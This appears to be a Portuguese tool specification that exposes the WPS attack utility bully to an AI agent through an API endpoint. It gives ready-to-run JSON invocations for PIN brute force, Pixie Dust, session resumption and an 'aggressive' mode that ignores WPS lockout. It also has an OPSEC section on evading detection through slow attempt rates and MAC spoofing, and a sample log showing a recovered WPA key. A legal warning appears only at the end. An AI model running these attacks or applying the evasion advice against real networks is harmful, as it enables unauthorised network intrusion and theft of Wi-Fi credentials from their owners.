---
name: "bully"
description: "Ferramenta de ataque WPS por brute force de PIN e Pixie Dust. Alternativa ao reaver com melhor tratamento de timeouts, bloqueios e sessões interrompidas. Opera diretamente em modo monitor. Deve ser usada apenas em redes autorizadas."
---
# bully

## Objetivo

O bully é uma implementação de ataque WPS (Wi-Fi Protected Setup) escrita em C, projetada como alternativa mais robusta ao reaver. Seu foco é o brute force do PIN WPS de 8 dígitos e o ataque Pixie Dust, com melhor gerenciamento de estados de erro, bloqueio de AP e retomada de sessões interrompidas.

O WPS usa um PIN de 8 dígitos dividido em dois grupos de 4, validados separadamente pelo AP — isso reduz o espaço de busca de 10^8 para 10^4 + 10^3 = 11.000 combinações. O Pixie Dust explora geração fraca de nonces aleatórios em implementações vulneráveis para recuperar o PIN em segundos offline.

Capacidades principais:
- PIN WPS brute force com ordem inteligente de tentativas
- Pixie Dust attack (Nonce-based offline crack)
- Retomada automática de sessões interrompidas
- Controle fino de delays e timeouts para contornar proteções
- Suporte a WPS locked state com estratégias de evasão
- Verbose multi-nível para diagnóstico e coleta de dados

## Endpoint

```
/api/tools/run
```

## Requer target

Sim. O BSSID do AP alvo é obrigatório. O ESSID é recomendado para identificação. O canal é necessário para operar em modo monitor.

## Pré-requisitos

- Interface wireless em modo monitor (ex: airmon-ng start wlan0)
- bully instalado (disponível no Kali Linux por padrão)
- pixiewps no PATH para Pixie Dust offline
- Chipset wireless compatível com injeção de pacotes
- Permissões root

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                              |
|-----------|--------|-------------|--------------------------------------------------------|
| tool      | string | Sim         | Nome da ferramenta: `"bully"`                          |
| options   | string | Sim         | Flags e argumentos passados diretamente ao bully       |

## Flags Importantes

| Flag                  | Descrição                                                                              |
|-----------------------|----------------------------------------------------------------------------------------|
| `-b AA:BB:CC:DD`      | BSSID do AP alvo (obrigatório)                                                         |
| `-e "EssiD"`          | ESSID da rede alvo                                                                     |
| `-c N`                | Canal do AP (1-14 para 2.4GHz)                                                         |
| `-i wlan0mon`         | Interface em modo monitor                                                              |
| `-v N`                | Nível de verbosidade: 1 (normal), 2 (detalhado), 3 (máximo — necessário para Pixie)   |
| `-d N`                | Delay em segundos entre tentativas de PIN                                              |
| `-T N`                | Timeout em segundos para resposta do AP                                                |
| `-p XXXXXXXX`         | Tenta um PIN específico em vez de brute force                                          |
| `-s arquivo`          | Arquivo de sessão para retomar ataque interrompido                                     |
| `-f`                  | Force mode: continua mesmo após erros e NAKs                                           |
| `-L`                  | Ignora estado WPS Locked (continua tentando)                                           |
| `-S`                  | Usa timeouts menores (mais rápido, mais suscetível a erros)                            |
| `--pixie`             | Ativa modo Pixie Dust (requer -v 3 para coletar dados necessários)                     |
| `-o arquivo`          | Salva output em arquivo                                                                |
| `-A`                  | Não tenta autenticação 802.11 antes de WPS                                             |
| `-w`                  | Salva sessão automaticamente a cada tentativa                                          |

## Exemplos

### Exemplo 1 - Brute force PIN WPS padrão

```json
{
  "tool": "bully",
  "options": "-b AA:BB:CC:DD:EE:FF -e \"RedeAlvo\" -c 6 -i wlan0mon -v 2"
}
```

**Descrição:** Executa brute force completo do PIN WPS de 8 dígitos com verbosidade detalhada. Pode levar de minutos a horas dependendo dos delays e proteções do AP.

### Exemplo 2 - Ataque Pixie Dust

```json
{
  "tool": "bully",
  "options": "-b AA:BB:CC:DD:EE:FF -e \"RedeAlvo\" -c 11 -i wlan0mon -v 3 --pixie"
}
```

**Descrição:** Coleta PKE, PKR, E-Hash1, E-Hash2, AuthKey e E-Nonce com verbosidade máxima e tenta Pixie Dust offline via pixiewps. Completa em segundos em roteadores vulneráveis.

### Exemplo 3 - Retomada de sessão interrompida

```json
{
  "tool": "bully",
  "options": "-b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon -s /tmp/bully_session_AABBCCDDEEFF.bully -v 1"
}
```

**Descrição:** Retoma o brute force de onde parou usando arquivo de sessão salvo. Essencial para ataques longos que podem ser interrompidos por queda de sinal ou reinicializacao do AP.

### Exemplo 4 - PIN específico com delays para evitar lock

```json
{
  "tool": "bully",
  "options": "-b AA:BB:CC:DD:EE:FF -c 6 -i wlan0mon -p 12345670 -d 5 -T 10 -v 2"
}
```

**Descrição:** Testa um PIN específico com delay de 5 segundos e timeout de 10 segundos. Útil quando o PIN padrão do fabricante é conhecido (ex: derivado do MAC).

### Exemplo 5 - Modo agressivo ignorando WPS lock

```json
{
  "tool": "bully",
  "options": "-b AA:BB:CC:DD:EE:FF -c 1 -i wlan0mon -L -f -S -v 2 -w -o /tmp/bully_output.txt"
}
```

**Descrição:** Ignora estado WPS Locked, usa force mode, pequenos timeouts, salva sessao automaticamente e registra tudo em arquivo. Abordagem agressiva para APs com bloqueio temporário.

## OPSEC

- O bully envia frames EAP/WPS que são facilmente identificáveis por WIDS modernos
- Cada tentativa de PIN gera pelo menos 4 trocas de mensagens WPS (M1-M8) — padrão detectavel
- APs modernos implementam WPS lock após 3-10 tentativas falhas consecutivas — o delay `-d` ajuda a contornar
- O flag `-L` (ignorar lock) pode levar o AP a bloquear permanentemente o WPS
- Use `-d` alto (ex: -d 30) para reduzir a taxa de tentativas e parecer menos suspeito
- O MAC da interface em modo monitor fica visível nos frames — considere MAC spoofing antes
- Arquivos de sessão contêm histórico de PINs tentados — armazene de forma segura
- APs vulneráveis ao Pixie Dust geralmente expõem os dados necessários na primeira troca M1-M3
- AVISO LEGAL: Atacar WPS sem autorização é crime previsto na Lei 12.737/2012 (invasão de dispositivo informático). Penas de 3 meses a 2 anos de detenção. Use apenas em redes próprias ou com autorização documentada.

## Saída

```
[bully] Iniciando ataque WPS contra AA:BB:CC:DD:EE:FF (RedeAlvo) CH:6
[bully] Modo monitor: wlan0mon
[bully] [00:01:23] Tentando PIN: 12340000 (Progresso: 0.01%)
[bully] [00:01:35] M4 recebido — primeira metade do PIN correta: 1234
[bully] [00:02:10] Tentando PIN: 12345670
[bully] [00:02:15] WPS PIN encontrado: 12345670
[bully] Chave WPA: minhasenha123
[bully] Sessão salva em: /tmp/bully_session_AABBCCDDEEFF.bully

--- Modo Pixie Dust ---
[bully] PKE coletado: 3c4f...
[bully] E-Nonce: a1b2...
[bully] Passando dados ao pixiewps...
[pixiewps] PIN encontrado: 87654321 (0.003s)
```
